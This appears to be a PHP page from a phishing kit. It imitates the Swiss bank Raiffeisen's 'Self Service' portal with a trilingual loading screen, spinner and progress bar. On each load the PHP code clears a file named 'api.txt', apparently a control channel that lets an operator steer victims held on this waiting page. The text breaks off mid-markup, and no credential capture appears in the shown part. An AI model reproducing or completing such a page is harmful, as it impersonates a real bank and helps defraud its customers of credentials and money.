﻿<?php 

// Available languages
$supported_languages = ['de', 'fr', 'it'];

// Set default language
$default_lang = 'de';

// Get language from session, cookie, or default
$current_lang = $default_lang;


// Language translations
$translations = [
    'de' => [
        'page_title' => 'Raiffeisen Self Service',
        'lang_de' => 'Deutsch',
        'lang_fr' => 'Français',
        'lang_it' => 'Italiano',
    ],
    'fr' => [
        'page_title' => 'Raiffeisen Self Service',
        'lang_de' => 'Allemand',
        'lang_fr' => 'Français',
        'lang_it' => 'Italien',
    ],
    'it' => [
        'page_title' => 'Raiffeisen Self Service',
        'lang_de' => 'Tedesco',
        'lang_fr' => 'Francese',
        'lang_it' => 'Italiano',
    ],
];

// Get translation helper function
function t($key) {
    global $translations, $current_lang;
    return isset($translations[$current_lang][$key]) ? $translations[$current_lang][$key] : $key;
}

// Get current language
function getCurrentLang() {
    global $current_lang;
    return $current_lang;
}

// Get language code for HTML lang attribute
function getHtmlLang() {
    global $current_lang;
    $lang_map = [
        'de' => 'de-CH',
        'fr' => 'fr-CH',
        'it' => 'it-CH'
    ];
    return isset($lang_map[$current_lang]) ? $lang_map[$current_lang] : 'de-CH';
}
 
 $blank_page = ' ';
    $up_file = fopen("api.txt", "w");
    fwrite($up_file, $blank_page);
?>

<!doctype html>
<html lang="<?= getHtmlLang() ?>" translate="no">
<head>
        <link
            rel="icon"
      
            href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAAMAAAADACAIAAADdvvtQAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAABmJLR0QA/wD/AP+gvaeTAAAAB3RJTUUH3wIGDyEVmgm+0wAAEQ9JREFUeNrt3XuQVFV+B/DfOed2377d82IYhscMMAgsiICACCzoKI48ZyA+GK2t3U00FRPLVFKJMVrJppJU1jW1j0qqdmPtZreMa8psVmR9waAoKK6KKG8RFAXkMbwZGGa6+/a9fc85+aMH1EnDzPQ9d85t5vepQQZKmt+v+8u5t2+few6RUgJChaK6C0DFDQOEfMEAIV8wQMgXDBDyBQOEfMEAIV8wQMgXDBDyBQOEfMEAIV8wQMgXDBDyBQOEfMEAIV8wQMgXDBDyBQOEfMEAIV8wQMgXDBDyBQOEfMEAIV8wQMgXDBDyBQOEfMEAIV8M3QX0LylASJASpJRSgJQgBACAlABScgGCgxAgRW7JAAIECAFKgTHCjNz3hDJgDCj+2wMIZ4Bk1gXPA5AAABJAyq5XNPd6CyHFxVeacyk4eJ70POBZ6Xndv8+60nXAdWQmIx1bZjLSufjlOtJxpOtA1pX84h/0spJzEByEBAAgQCgFxiASJRGTmCZJlNDScloxmFVV06pqVlFJK4fQyiqaKIFcwgaY8AWIe8mnf+Z8+A5QChIA5JcBEuJigHLp8STnwLnkHHKRyuWp65dCyq7/PzfAgJS5gaYrml3IV37u/uNSiL/ykwQAQggQCkaExGK0pIwOHsKG1xqjx0XGX2uMHMOG1tCy8gESptAFSEqZPbjP2foeMb5aG/nat/Krr/HXv+/6nf//SwIECn5J8/9BwWUqyVOd/ESru3s7ECBRk5ZVGLV1kQmTo9NmRSZMZsNqSNTU/aQGKHQBAgCglDADWChr6yYXTXYxYZyLc2fds6edHR+QF59l1cOjk2eYs+ujM+YYQ0eAEdFdrnrF8CIVF0KAMQIAnPPjR9Kth+wNLUbNKHPOrdZtSyPXTiVWXHeJKmGAgkQoYRQE9w4f8A7tt197IXrjvHhjszljDomX6C5ODQxQv6AUAERHu/3GK877b5uz6xMr/jA6bRaJRHVX5hcGqB8RQpgh00l7wxp32yZr8Z2Je+43Rl2juyxf8GpYvyOEMCY62lPPPXXusQfsdS/JjK27psJhgDQhBCjz9n/S/sSjHT//IW87rbugAmGAtKJM2unUb59qf/wR78CnuqspqAPdBQx4hACA8+6G8//ysPvRVt3V9BkGKBwoze7Z2f7Eo+7OD3SX0sfCdReALmLM2/9p+w//Prtnh+5S+gADFCaMeZ9/cuHf/tk7fFB3Kb2FAQoZxtyPtnb84kfiwnndpfQKBih8KM1sfDX1/K/B83SX0otidReA8uE8tfJpZ9sm3XX0DAMUSoSIc2eTzzwpzrfpLqUHAzlAXZOj83+B7m3UGHO2v2+//rLuZ6kHA+PD1NysVkJyk3WA5CbJM6CMUAqUAqFfTjqUUnIOXrZrajbnUkoghFDa37NUuZd66X9iN9/ORozS/Qxe1gAIkJSRyTPMmXNpaTkpKaUxC6IxYpokGoWISQyDGEZXqggBCSA86brSTotUp+y4wM+c9I4d5q2H+clWfr4NHKfrPo1+QJl38DN7Q0vJdx4M7Qzrqz9AUvDY3Pmlf/JXQAp61aWUWVdmbNF2Jvv5J+6e7e6OD7wvPhd2uj/GJMHtN16xFt/JhgzT8eT17OoPEMDFmcuF/lkSNbtmy48ZbzU0ivNt7t6d9oYWZ/NG3nYm2BhRlt3/qbPl3fjSFZqeu54K1F1AsWGMVlXH6hdWfO9HlT9+KrH8XpIoAc6D+wulm8m8vU7aad2d54cBKhCJmtGpM8sf+9dB//jvkeumd93hGsRfRJm7e7t39AvdHeeHAfKFmLHY/CWDfvCktXB5UAcyQkTbaXfXFt295ocBUsCorSv/m+/Hl90bUIYk99xdW6ST0d1oHhggNWhlVdlDj1kNTSDVX4EkhGY/2xPOq9IYIGXooKrShx6LXDcdhOpzakr56ZNe62HdLeYrTXcBVxWjZnTp/X9JyyqUj0PSToZz0jQGSDFzTn3s1iXK35RJzsP5RgwDpBiJmvGmZjposNpBiADxjh0J4dUgDJB6kYlTo1NvkGrPhAgRZ0+JVKfu5rrDAKlHrLj5zflE7fI0hIiOdplO6W6uOwxQICITpyg/lZbplMyE7lIQBigQxohRbFiNylNpQqTrSjyEDRCkrJwNq5Fq38x7WWnjIWxgIJTRqmq182KlEMJxdHfWHQYoGITQsgoAH/OQ8pDgZXU31h0GKCjEjAEhiifnB/BBm08YoGDkFpJWjjHdjXWHAQqGlJB1QEqFhzBCKTFjuhvrDgMUDClFKpnbqEHZYxoRGr61XTFAwZBS8fQdKYkZI6VluhvrDgMUCOlm+JlTat+CkUQpsRK6O+sOAxQIfvY0P3mMKLz/UEg2eAgtKdXdWXcYoEDw1kOi7TRQlSMQqx1N8RA2IAjh7Noq0ymVhzBCjbpxIdyABgOknuhod7e8p/YxiWVFxk/S3VkeGCD13I+2ZvfvBabwBEjQIcMjY8br7iwPDJBi0k7br74gU0mVxy8potdOpYOrdTeXBwZIMWfzxsz7byle/yUSNW+cF8LL0IABUoufaE0++wuZSqq8RVUINrw2On2O7ubywwApI+1U8pkn3d3bFQ8/Upqz6tnwkbr7yw8DpIbMZlMrf51es1Lx7fFS0vIKq6GRREK632rorisUI+k6qVXPdD79U+k6agMkBY/OnBedPEN3i5eFAfJLnG9L/uaXqef+S2Zs9cNPaXl8+bfCvE8vBsgHIdy9O5NP/yzz3gYQQvnaLlJw6+YF5sy5uvu8EgxQQYTgJ46m1/4u/fL/eiePEcbUrwwkhTGsNnHvH4fz3fslGKC+kU7Gaz2UeXud/frL3sHPAIAENM2UskTzfdFJ03R33AMMUC8IIZ0MP30iu2dn5oPfu9vf56eOg5QBrhYteKx+UfwPvhXa5aEvGUgBkhIEB3r5w03XPgcitza06LjAz57iJ495B/ZlP/koe3AfP3NSug7JPUJwL60QRt340gcephWVup+yng2kAAme2fSWu2cnteIQjRLDAMqA0FywpJeVmYxMdYrODnHhvGhvE+fOivZzItkBriulzG2KoHjJhDxFClpZVfbnfxeZOEX389UrAylAzDDqxqWef8Z5d33X/TEk90OChNx/Zdc2KwQIkNzmB4QAY/10IJGCJErLHnw0Vr9Q95PVWwMpQADGyDHlj/2gPZN2d2wGeunkl1z64FznGYeUxEqU/unD8WX39NNeHCoUTaGqGDWjy/7ie6x2THBLgxdCCpIoLX3wbxPN94ER0k8t8hpwAQKA6JQbyh54mMRL9G8KliMErRpa/tf/lGi+j0Siuqvpm4EYIACINTTGm5rDkB/JuTFhcsU//CTedA8pqrEnZ4AGiJixkm//WWTSNPVrOveeEGAY8cYVlY8/GZt7WxGd93xVURatBBsxsvSPHiIl5RqWvJAShDDqxlU88njFo08YdeN0PxmFG1jvwrox5zVYC5enX3i2/y74SglC0CFDrQXLE3d91xg9NvzXmq9sQAeIRM1E8/3Olvf40S8CP4IIAQB0yNDYTQviTc2Ra6cW3flyXgM6QAAQGTshcdd3Ov7jiUAOZJc+GzEtY/TY2E0N1vylxtgJJGrq7luZgR4gIMRadIe9oSW7e5vy5ZuIFTdqRkUmzzBn1UenzGBDhhXpmfIVDPgAAbAhwxJ3f7f9s4/B81Q+ruDRqTPLH/m+UVsXwpXFVLna/kEUJnbzAnP6bMVbnxLq7trifPhOsZ8mXxkGCACAlg+K3/FtElc69ZgQmUl3Pv1TZ6vi++RDBQPUxZxVH50+R/F1RULFmZOd//kTfvyI7v6CggHqQsvK48vuVb8EGGXu7m3J3/xKuqFbI1xNf7oLCBFz1s3R62ep3wSeQHrNysy763X3FwgM0JdoWUV8WTOxLNUPTGSyM/nfP+enjutuUT0M0NeYs2+JTJkplQ9CjGX37ky/8ttwTUJSAQP0NbR8ULyxOZBbsaRMr16Z3R/GjXP9wAB1F5t7a3TSNPVnQpTyE0fSLSuBK71cqRsGqDs6qCreuAICWQ2DZN5cmz2wT3eLKmGA8jBvuj0ycWogg9DJY/ZrL1xNgxAGKA9WVR1vXAFGIB8U2htasl98rrtFZTBA+cXqF0W+cZ36Ca+U8uNH7XUvqR/eNMEA5ceqh8UX3xXQwt72hjXekQO6W1QDA3RZsflLjGu+of7KDaW89bD9xisgr4ZrQhigy2LDa+OL7wxkCpiU9uuveEcP6W5RAQzQlcRuazLqxgUxCHlHDtrrV4fhxjS/reguINSMESOtRXcEMiNMSnvdS96xw7pb9AsDdEWUWg1NxqhrAhmEDu3PvLVWd4e++9BdQNgZI8dYC5YF8tCCp197kZ9o1d2iLxignlBqLVjOakYFMAgx78CnmbfX6e7QXxO6CygCRt14q6EpkKU8PC+9dhU/fUJ3i4XDAPUCpdaiO9mwWvU3HzKW/XxvUQ9CGKBeiYydEJu/JJBLf142vXYVP3tKd4sFwgD1DmPW4rvokOHqByHKsvs+dt4p1hnTGKDeioyfZN2yMJBByHXTLc+Lc2d1t1gIDFBvkUjEWnI3HVwdxJmQu3dXZtObulssBAaoDyITp8Ruuj2QifGuk169UrS36W6xzzBAfUCiZryxmVZWBTIIfbzNeX+j7hb7DAPUN5HrpsXmNQQyCDmZ9JrnRUe77hb7BgPUNyRqWo0raEVlAIOQ4X60xfnwHd0t9g0GqM+iU24w59wiA1jeVdjp9JqVMtmpu8U+wAD1GTFj8aZ7aKn65V0JZe6OzcW1HAwGqBDR6280Z92sfhAiRKSS6dXPyVTRDEIYoEIQKx5vupcmStU/MmXOtk3Ots26W+wtDFCBzBmzzRvmql+GgRCZ7Ey3rJSppO4WewUDVCCSKLWamqnaVfFyKHW2vOvu2qK7xd4Vq7uAImbOnBe9XvXSnABAiOy4kG55Xtpp3S32DANUOFpWEW9qJjHlC1IBUOps3uju3qa7xV5UqruA4mbOviUydWYQgxC/0J5es1I6Gd0t9gAD5AutGBRvbCYx9QtSEUqdTW+5e3bobrGnZ0B3AUUv9s1bI5OmBzIItZ+zW1bJrKu7xSvBAPlFK6viS++GqPqtdwilmffWZz/ZrbvFK7avu4CrgXnT7ZGJUwIZhM6eSa9dJb2s7hYvCwOkAKuqji8NZEEqQknm9+u8fXt0t3hZGCA1YvULA1mQilBx+mT61d9BWAchDJAarHq4teRuoAFs60RJZuNroV0fGAOkjHXrYmPsBPWTFQnlp47br70YzqU5MUDKBLggFSH2my3Zg2FcmhMDpFKsocmoGxvAIET4iVZ73Ysh3CkBA6SSMWKUtejOQBakImCvX+0d2q+7xe4wQEoRYt2+LJAFqQjlx47Y614KZHdpHzBAihm1o60FywPaJ9Vev9o7clB3i1+DAVKNMmvBsmAWpKLe0S/s9atDNQhhgNQzRo+zGpoCeZGltNe9HKqlOa/6AOnYcpsxa9EdxvCaQAahw/szb7aEZxAKZYCElIKDECq+OHDR/0935JoJsflL1XXx5ZfMZtMtq7zQbAMdyF4QfhAgbOjwyNgJwAwFqxISAO7RQYP7uw3G4ktXZHdvF8kO9aMgIdm9u4ya0f3dVN5aZGgGw0tEZ4d0lU3lJAAknlC/n3fPbXDRcUEG8/kDNS1Sov6utAKEMUCoiITyHAgVDwwQ8gUDhHzBACFfMEDIFwwQ8gUDhHzBACFfMEDIFwwQ8gUDhHzBACFfMEDIFwwQ8gUDhHzBACFfMEDIFwwQ8gUDhHzBACFfMEDIFwwQ8gUDhHzBACFfMEDIFwwQ8gUDhHz5P/iytyPqUjF3AAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE1LTAyLTA2VDE1OjMzOjIxKzAxOjAwuM4j0QAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxNS0wMi0wNlQxNTozMzoyMSswMTowMMmTm20AAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC"
        />
        <meta charset="utf-8" />
    
        <title>Raiffeisen Self Service</title>
   

        <link
            rel="icon"
            type="image/x-icon"
            data-savepage-href="favicon.ico"
            href="data:image/x-icon;base64,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"
        />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    
    <link
        rel="icon"
        type="image/x-icon"
        href="favicon.ico"
    />
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #ffffff;
            color: #474d57;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Header Styles */
        header {
            background-color: #ffffff;
            border-bottom: 1px solid #e5e5e5;
            padding: 20px 0;
            min-height: 80px;
        }

        .header-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .logo {
            display: flex;
            align-items: center;
            text-decoration: none;
            color: #cc132c;
            font-size: 24px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }

        .logo:hover {
            color: #a81025;
        }

        .language-switcher {
            display: flex;
            gap: 10px;
        }

        .lang-btn {
            background: none;
            border: 2px solid transparent;
            padding: 6px 12px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            color: #474d57;
            border-radius: 4px;
            transition: all 0.2s ease;
        }

        .lang-btn:hover {
            background-color: #f5f5f5;
        }

        .lang-btn.active {
            border-color: #cc132c;
            color: #cc132c;
            background-color: #fef2f4;
        }

        /* Main Content */
        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 60px 20px;
        }

        .loading-container {
            text-align: center;
            max-width: 500px;
            width: 100%;
        }

        .loading-spinner {
            width: 80px;
            height: 80px;
            margin: 0 auto 40px;
            position: relative;
        }

        .spinner {
            width: 100%;
            height: 100%;
            border: 4px solid #f0f0f0;
            border-top: 4px solid #cc132c;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 24px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 12px;
        }

        .loading-subtext {
            font-size: 16px;
            color: #6c757d;
            line-height: 1.5;
        }

        .loading-dots {
            display: inline-block;
        }

        .loading-dots::after {
            content: '';
            animation: dots 1.5s steps(4, end) infinite;
        }

        @keyframes dots {
            0%, 20% { content: ''; }
            40% { content: '.'; }
            60% { content: '..'; }
            80%, 100% { content: '...'; }
        }

        /* Progress Bar */
        .progress-container {
            margin-top: 40px;
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background-color: #e5e5e5;
            border-radius: 2px;
            overflow: hidden;
            position: relative;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #cc132c, #e8384f);
            border-radius: 2px;
            animation: progress-animation 2s ease-in-out infinite;
            width: 50%;
        }

        @keyframes progress-animation {
            0% {
                transform: translateX(-100%);
            }
            100% {
                transform: translateX(200%);
            }
        }

        /* Footer */
        footer {
            background-color: #f8f9fa;
            border-top: 1px solid #e5e5e5;
            padding: 30px 20px;
            text-align: center;
        }

        .footer-container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .footer-text {
            font-size: 14px;
            color: #6c757d;
            margin-bottom: 10px;
        }

        .footer-copyright {
            font-size: 13px;
            color: #868e96;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .header-container {
                flex-direction: column;
                gap: 15px;
            }

            .loading-text {
                font-size: 20px;
            }

            .loading-subtext {
                font-size: 14px;
            }

            .loading-spinner {
                width: 60px;
                height: 60px;
                margin-bottom: 30px;
            }
        }

        /* Accessibility */
        @media (prefers-reduced-motion: reduce) {
            .spinner {
                animation-duration: 3s;
            }
            
            .progress-fill {
                animation-duration: 4s;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="header-container">
            <a href="index.php" class="logo">
                Raiffeisen
            </a>
            <div class="language-switcher">
                <button class="lang-btn <?= getCurrentLang() === 'de' ? 'active' : '' ?>" onclick="switchLang('de')" title="<?= t('lang_de') ?>">de</button>
                <button class="lang-btn <?= getCurrentLang() === 'fr' ? 'active' : '' ?>" onclick="switchLang('fr')" title="<?= t('lang_fr') ?>">fr</button>
                <button class="lang-btn <?= getCurrentLang() === 'it' ? 'active' : '' ?>" onclick="switchLang('it')" title="<?= t('lang_it') ?>">it</button>
            </div>
        </div>
    </header>

    <main>
        <div class="loading-container">
            <div class="loading-spinner">
                <div class="spinner"></div>
            </div>
            
            <?php
            $loading_texts = [
                'de' => [
                    'title' => 'Wird geladen',
                    'text' => 'Bitte warten Sie einen Moment'
                ],
                'fr' => [
                    'title' => 'Chargement',
                    'text' => 'Veuillez patienter un moment'
                ],
                'it' => [
                    'title' => 'Caricamento',
                    'text' => 'Attendere un momento'
                ]
            ];
            
            $current_loading = $loading_texts[getCurrentLang()] ?? $loading_texts['de'];
            ?>
            
            <div class="loading-text"><?= $current_loading['title'] ?><span class="loading-dots"></span></div>
            <div class="loading-subtext"><?= $current_loading['text'] ?></div>
            
            <div class="progress-container">
                <div class="progress-bar">
